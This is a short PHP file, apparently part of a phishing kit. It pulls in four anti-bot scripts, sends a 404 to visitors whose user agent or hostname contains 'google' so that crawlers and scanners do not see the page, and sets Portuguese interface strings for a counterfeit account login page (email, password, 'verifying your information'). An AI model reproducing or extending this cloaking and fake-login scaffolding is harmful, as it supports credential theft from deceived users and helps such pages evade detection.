<?php
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

// connexion
$ERROR="Alguns dados informados estão incorretos. Tente novamente.";
$Email= "E-mail";
$Password = "Senha";
$dok = "Log in";
$req1 = "Obrigatório.";
$req2 = 'Obrigatório.';
$forgot ="Não consegue acessar sua conta?";
$sign = "Criar conta";
$checking = "Verificando suas informações...";
$priva = "Privacidade";
$ri8 = "Todos os direitos reservados";
$legal = "Termos e Condições";
// fin connexioon
?>